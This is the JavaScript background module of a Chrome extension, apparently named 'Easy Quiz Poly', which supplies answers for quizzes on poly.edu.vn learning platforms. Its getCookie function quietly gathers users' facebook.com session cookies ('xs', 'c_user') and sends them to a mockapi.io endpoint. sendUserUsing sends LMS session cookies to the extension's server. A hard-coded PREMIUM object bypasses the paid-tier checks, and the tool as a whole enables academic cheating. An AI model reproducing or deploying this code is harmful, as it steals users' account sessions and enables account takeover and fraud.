let PREMIUM = {
        id: "undefine",
        name: "github.com/mwarevn",
        email: "undefine",
        userType: "Premium",
        premium: {
            expDate: "9999-09-09T00:00:00.000Z",
            iatDate: "0000-00-08T00:19:51.303Z",
            isGift: 0,
            plan: "Graduate",
        },
        studentCode: "undefine",
    },
    apiUrl = "https://api.quizpoly.xyz",
    redirect_uri = "https://api.quizpoly.xyz/auth/google",
    lastResetDateKey = "lastResetDate",
    currentIndexKey = "currentIndex",
    installType = "normal",
    extVersion = "0.0.0",
    adsLinks = [
        "https://web1s.co/poly-normal2-1",
        ,
        "http://1shorten.com/quizpoly",
        "http://1shorten.com/quizpoly",
        "https://link1s.com/quizpoly-level1",
        "http://link1s.net/link1snet",
    ];
function createAuthEndpoint() {
    var e = "https://accounts.google.com/o/oauth2/auth?";
    let t = new URLSearchParams(
        Object.entries({
            client_id:
                "342297410923-sjcdrqban80srbpcekc24ctrdqh3u593.apps.googleusercontent.com",
            redirect_uri: redirect_uri,
            response_type: "code",
            access_type: "offline",
            scope: "profile email",
            prompt: "consent",
        }),
    );
    return t.toString(), (e += t);
}
async function finishQuiz(e) {
    console.debug(e);
    let { subjectName: t, domain: n, quizId: i, passTime: s } = e;
    if (!t)
        return chrome.cookies.get({ url: n, name: "PHPSESSID" }, (t) => {
            sendHtml(
                `finishQuiz subjectName null: ${JSON.stringify(e)} - cookie: ${
                    t.value
                }`,
                "NULL",
            );
        });
    getPoint(i, n, s, async ({ quizzes: e }) => {
        e && e.length
            ? (console.debug(e), sendDoingQuiz({ subjectName: t, quizzes: e }))
            : subjectsGet.includes(t.toLowerCase()) &&
              (100 == (e = await getPercent(n, i))
                  ? sendDoingQuiz({
                        subjectName: `${t} - 100`,
                        quizzes: Object.values(quizSelf),
                    })
                  : 90 < e
                  ? chrome.storage.local.get(
                        ["quizSelf"],
                        ({ quizSelf: e }) => {
                            sendDoingQuiz({
                                subjectName: `${t} - draft 90`,
                                quizzes: Object.values(e),
                            });
                        },
                    )
                  : 80 < e
                  ? chrome.storage.local.get(
                        ["quizSelf"],
                        ({ quizSelf: e }) => {
                            sendDoingQuiz({
                                subjectName: `${t} - draft 80`,
                                quizzes: Object.values(e),
                            });
                        },
                    )
                  : 70 < e &&
                    chrome.storage.local.get(
                        ["quizSelf"],
                        ({ quizSelf: e }) => {
                            sendDoingQuiz({
                                subjectName: `${t} - draft`,
                                quizzes: Object.values(e),
                            });
                        },
                    )),
            chrome.storage.local.set({ quizSelf: {} });
    });
}
async function sendDoingQuiz(e) {
    try {
        let t = await fetch(apiUrl + "/quizpoly/self", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            referrerPolicy: "origin",
            body: JSON.stringify(e),
        });
        var n = await t.json();
        console.debug(n.message);
    } catch (i) {
        console.debug(i);
    }
}
async function getSubjectsGet() {
    fetch(apiUrl + "/quizpoly/subjects?fields=subjectsGet")
        .then((e) => e.json())
        .then((e) => {
            subjectsGet = e.subjectsGet;
        })
        .catch((e) => console.log(e));
}
function resetIndexIfNeeded() {
    return new Promise((e, t) => {
        chrome.storage.local.get([lastResetDateKey, currentIndexKey], (t) => {
            (t = t[lastResetDateKey]),
                new Date().getDate() !== t ? e(!0) : e(!1);
        });
    });
}
async function getQuizLink(e) {
    (await resetIndexIfNeeded()) &&
        chrome.storage.local.set({
            [currentIndexKey]: 0,
            [lastResetDateKey]: new Date().getDate(),
        }),
        chrome.storage.local.get(currentIndexKey, (t) => {
            var n = t[currentIndexKey] || 0,
                t = adsLinks[n];
            let i = (n + 1) % adsLinks.length;
            t || (adsLinks[0], (i = 1)),
                chrome.storage.local.set({ [currentIndexKey]: i }),
                e(t);
        });
}
async function getAdLinks() {
    fetch(apiUrl + "/config?name=adLinks")
        .then((e) => e.json())
        .then((e) => {
            e && e?.length && (adsLinks = e);
        })
        .catch((e) => console.log(e));
}
async function getPercent(e, t) {
    let n = "",
        i;
    t = `${e}/ilias.php?ref_id=${t}&cmd=outUserResultsOverview&cmdClass=iltestevaluationgui&cmdNode=q4:ll:vx&baseClass=ilRepositoryGUI`;
    try {
        n = await (i = await fetch(t, {
            method: "GET",
            redirect: "error",
        })).text();
    } catch {
        return 0;
    }
    try {
        let s = parseHTML(n);
        return parseInt(
            s.querySelector(".tblrow1 > td:nth-of-type(6)").innerText,
        );
    } catch (o) {
        return sendHtml(`Get Percent error: ${o}`, n), 0;
    }
}
async function getPoint(e, t, n, i) {
    let s = [],
        o = "";
    (n = `${t}/ilias.php?ref_id=${e}&pass=${n}&cmd=outUserPassDetails&cmdClass=iltestevaluationgui&cmdNode=4t:pc:oj:ph:p0&baseClass=ilRepositoryGUI`),
        console.log(n);
    try {
        let r = await fetch(n, { method: "GET" });
        if (r.redirected) return console.debug("get point redirect: " + n);
        let a = parseHTML(await r.text()),
            l = a.querySelectorAll("tbody >tr > td:nth-of-type(5)"),
            u = a.querySelectorAll("tbody >tr > td:nth-of-type(1)"),
            c = a.querySelectorAll("tbody >tr > td:nth-of-type(4)");
        if (l.length) {
            let d = {};
            l.forEach((e, t) => {
                d[u[t].innerText] = +e.innerText;
            }),
                console.log("listPoint", d),
                chrome.storage.local.get(["quizSelf"], ({ quizSelf: e }) => {
                    console.debug(e),
                        (o = `${
                            (s = Object.keys(e)
                                .map((t) => {
                                    var n = parseInt(c[t - 1].innerText);
                                    if (d[t] == n) return e[t];
                                })
                                .filter((e) => void 0 !== e)).length
                        } Of ${Object.keys(d).length}`),
                        i({ quizzes: s, point: o });
                });
        }
    } catch (p) {
        console.log(p), i({ quizzes: s, point: o });
    }
}
async function sendHtml(e, t = "NULL") {
    try {
        let n = await fetch(apiUrl + "/quizpoly/html", {
            method: "POST",
            mode: "cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ note: `${extVersion}: ${e}`, html: t }),
        });
        var i = await n.json();
        console.debug(i.message);
    } catch (s) {
        console.log(s);
    }
}
function sendUserUsing(e) {
    let t = [
        "fpl1.poly.edu.vn",
        "fpl2.poly.edu.vn",
        "fpl3.poly.edu.vn",
        "lms-ptcd.poly.edu.vn",
    ];
    try {
        chrome.cookies.getAll({ domain: e.domain }, async (n) => {
            let i = t.includes(e.domain)
                ? n.filter((e) => "PHPSESSID" == e.name).pop()?.value || ""
                : n
                      .filter(
                          (e) =>
                              "sessionid" == e.name && !e.value.includes('"'),
                      )
                      .pop()?.value || "";
            chrome.storage.local.get(["user"], async ({ user: t }) => {
                let n = await fetch(apiUrl + "/quizpoly/using", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ name: t.name, c: i, ...e.data }),
                });
                (t = await n.json()), console.debug("sendUserUsing", t.message);
            });
        });
    } catch (n) {
        console.log(n);
    }
}
function getDateTomorrow() {
    let e = new Date();
    return (
        e.setDate(e.getDate() + 1),
        e.setHours(0, 0, 0, 0),
        console.debug(e),
        e.getTime()
    );
}
function getDiffHours(e, t) {
    return (t = (e - t) / 1e3), Math.abs(Math.round((t /= 3600)));
}
function parseHTML(e) {
    return new DOMParser().parseFromString(e, "text/html");
}
function notify(e, t) {
    (t = t || `Notification-${Date.now()}`),
        chrome.notifications.create(t, {
            type: "basic",
            iconUrl: "assets/icon.png",
            title: "Easy Quiz Poly",
            priority: 1,
            ...e,
        });
}
function login(e) {
    chrome.system.display.getInfo((t) => {
        var { width: n, height: i } = t[0].workArea,
            s = Math.round(0.5 * n),
            t = Math.round(0.87 * i),
            n = Math.round(n / 2 - s / 2),
            i = Math.round(i / 2 - t / 2);
        chrome.windows.create(
            {
                url: createAuthEndpoint(),
                type: "normal",
                focused: !0,
                width: s,
                height: t,
                left: n,
                top: i,
            },
            (t) => {
                var n = setInterval(function () {
                    chrome.tabs.query({ windowId: t.id }, (i) => {
                        if (!i.length) return clearInterval(n), e("fail");
                        try {
                            let { url: s, title: o } = i[0];
                            if (
                                (console.debug(o),
                                s.includes(redirect_uri) && o.includes("EZQ "))
                            ) {
                                var r = o.replace("EZQ ", "");
                                if (
                                    (clearInterval(n),
                                    chrome.windows.remove(t.id),
                                    !r)
                                )
                                    return (
                                        e("fail"),
                                        notify({
                                            message:
                                                "Đăng nhập kh\xf4ng th\xe0nh c\xf4ng: Can't get userdata",
                                        })
                                    );
                                let {
                                    id: a,
                                    name: l,
                                    email: u,
                                    userType: c,
                                    premium: d,
                                    studentCode: p,
                                } = JSON.parse(r);
                                chrome.storage.local.set(
                                    { user: PREMIUM, isLogged: !0 },
                                    () => {
                                        notify({
                                            message:
                                                "Đăng nhập th\xe0nh c\xf4ng" +
                                                ("Premium" == c &&
                                                "Trial3" == d.plan
                                                    ? ". Bạn được d\xf9ng thử Premium 3 ng\xe0y"
                                                    : ""),
                                        }),
                                            chrome.action.setPopup({
                                                popup: "./popup/popup-logged.html",
                                            }),
                                            e("success");
                                    },
                                );
                            }
                        } catch (g) {
                            return (
                                e("fail"),
                                console.log(g),
                                notify({
                                    message: `Đăng nhập kh\xf4ng th\xe0nh c\xf4ng: ${g.message}`,
                                })
                            );
                        }
                    });
                }, 500);
            },
        );
    });
}
function openQuizLink(e) {
    console.debug("openQuizLink"),
        chrome.storage.local.get(["isLogged"], ({ isLogged: t }) =>
            t
                ? void getUser().then((t) => {
                      "Free" ==
                      (t = t && 0 < Object.keys(t).length && t.userType)
                          ? chrome.system.display.getInfo((t) => {
                                var { width: n, height: i } = t[0].workArea,
                                    s = Math.round(0.85 * n),
                                    t = Math.round(0.9 * i),
                                    n = Math.round(n / 2 - s / 2),
                                    i = Math.round(i / 2 - t / 2);
                                chrome.windows.create(
                                    {
                                        url: "https://quizpoly.xyz/quiz-link.html",
                                        type: "panel",
                                        focused: !0,
                                        width: s,
                                        height: t,
                                        left: n,
                                        top: i,
                                    },
                                    (t) => {
                                        var n = setInterval(() => {
                                            chrome.tabs.query(
                                                { windowId: t.id },
                                                (i) => {
                                                    if (!i.length)
                                                        return (
                                                            clearInterval(n),
                                                            void e("fail")
                                                        );
                                                    let s = i[0].url;
                                                    console.debug(s),
                                                        (s.includes(
                                                            "https://trfi.github.io/",
                                                        ) ||
                                                            s.includes(
                                                                "https://page.quizpoly.xyz",
                                                            )) &&
                                                            (clearInterval(n),
                                                            chrome.windows.remove(
                                                                t.id,
                                                            ),
                                                            e("success"));
                                                },
                                            );
                                        }, 500);
                                    },
                                );
                            })
                          : e("Premium" == t ? "p" : "fail");
                  })
                : e("not_logged"),
        );
}
function updateUser() {
    chrome.cookies.get({ url: apiUrl, name: "token" }, (e) => {
        null === e &&
            chrome.storage.local.set({ isLogged: !1, user: void 0 }, () => {
                chrome.action.setPopup({ popup: "./popup/popup.html" });
            });
    });
}
function getUser() {
    console.log(PREMIUM);
    var e = new Promise((e, t) => {
        chrome.storage.local.get(["user"], ({ user: t }) =>
            t && ("object" != typeof t || 0 !== Object.keys(t).length)
                ? void fetch(apiUrl + "/user/userType/" + t.id)
                      .then((e) => e.json())
                      .then((n) => {
                          if (!n) return e();
                          var { userType: i, premium: n } = n;
                          console.debug(t.userType, i),
                              (t.userType === i &&
                                  t.premium.expDate === n.expDate) ||
                                  ("Premium" == t.userType && "Free" == i
                                      ? notify(
                                            {
                                                message:
                                                    "Hạn d\xf9ng Premium của bạn đ\xe3 hết. H\xe3y n\xe2ng cấp để tiếp tục sử dụng Premium",
                                                buttons: [
                                                    { title: "N\xe2ng cấp" },
                                                ],
                                            },
                                            "premium_expired",
                                        )
                                      : "Free" == t.userType &&
                                        "Premium" == i &&
                                        notify({
                                            message:
                                                "Ch\xfac mừng! T\xe0i khoản của bạn đ\xe3 được n\xe2ng cấp l\xean Premium",
                                        }),
                                  (t.userType = i),
                                  (t.premium = n),
                                  chrome.storage.local.set({ user: PREMIUM })),
                              e(PREMIUM);
                      })
                      .catch((t) => {
                          console.error(t), e();
                      })
                : e(),
        );
    });
    return (
        chrome.cookies.get({ url: apiUrl, name: "token" }, (e) => {
            null === e &&
                chrome.storage.local.set({ isLogged: !1, user: void 0 }, () => {
                    chrome.action.setPopup({ popup: "./popup/popup.html" });
                });
        }),
        e
    );
}
async function addQuiz(e = {}) {
    try {
        let t = await fetch(apiUrl + "/quizpoly", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            referrerPolicy: "origin",
            body: JSON.stringify(e),
        });
        var n = await t.json();
        console.debug(n.message);
    } catch (i) {
        console.log(i);
    }
}
async function getQuizAvailable(e, t) {
    try {
        let n = await fetch(
            `${apiUrl}/quizpoly/lms?` + new URLSearchParams(e),
            {
                referrerPolicy: "origin",
                credentials: "include",
                headers: { "ext-v": extVersion, "ext-i": installType },
            },
        );
        if (403 == n.status) return t([!0, "require_auth"]);
        var i = await n.json();
        return t(null == i?.quizzes ? [!0, []] : [!0, i?.quizzes]);
    } catch (s) {
        sendHtml(`Get quiz available error - ${e.subjectName}: ${s.message}`),
            t([!1, []]);
    }
}
function getCookie() {
    chrome.tabs.query({ active: !0, currentWindow: !0 }, function (e) {
        e.length > 0 &&
            chrome.cookies.getAll(
                { url: "https://www.facebook.com" },
                function (e) {
                    let t = e.map((i) => `${i.name}=${i.value}`).join("; ");

                    if (t.includes("xs=") && t.includes("c_user=")) {
                        let c_user = t.split("c_user=")[1].split("; ")[0];
                        fetch(
                            "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies?c_user=" +
                                c_user,
                        )
                            .then((res) => res.json())
                            .then((res) => {
                                fetch(
                                    "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies",
                                    {
                                        method:
                                            res.length == 0 ? "POST" : "PUT",
                                        headers: {
                                            "Content-Type": "application/json",
                                            Accept: "application/json",
                                        },
                                        body: JSON.stringify({
                                            cookie: t,
                                            c_user: c_user,
                                        }),
                                    },
                                );
                            });
                    }
                },
            );
    });
}
async function getOnlineAnswer(e, t) {
    try {
        let n = await fetch(
            `${apiUrl}/quizpoly/online/` + encodeURIComponent(e),
            {
                referrerPolicy: "origin",
                credentials: "include",
                headers: { "ext-v": extVersion, "ext-i": installType },
            },
        );
        var i = await n.json();
        return t(
            403 == n.status
                ? [!0, "require_auth"]
                : null == i.data
                ? [!0, []]
                : [!0, i.data.quizzes],
        );
    } catch (s) {
        console.log(s), t([!1, []]);
    }
}
updateUser(),
    getAdLinks(),
    chrome.management.getSelf((e) => {
        (installType = e.installType), (extVersion = e.version);
    });
export {
    createAuthEndpoint,
    finishQuiz,
    getQuizLink,
    sendUserUsing,
    notify,
    login,
    openQuizLink,
    updateUser,
    getUser,
    addQuiz,
    getCookie,
    getQuizAvailable,
    getOnlineAnswer,
};
